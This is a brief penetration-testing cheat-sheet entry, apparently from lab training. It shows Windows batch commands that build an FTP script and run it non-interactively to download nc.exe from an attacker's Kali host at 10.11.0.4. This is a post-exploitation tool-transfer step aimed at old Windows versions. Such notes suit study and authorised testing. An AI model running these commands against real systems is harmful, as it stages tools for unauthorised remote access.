## Using a FTP client on Windows to download and upload files from Kali

### Note : Be sure to configure the right IP, PORT and FILENAME
```bat
echo open 10.11.0.4 21> ftp.txt
echo USER offsec>> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt

# This will execute the previous script
ftp -v -n -s:ftp.txt
```

## FTP Basic CheatSheet
![[FTP Basic Cheatsheet.png]]

### Note : This technique is mostly used on old Windows version (XP, 2003)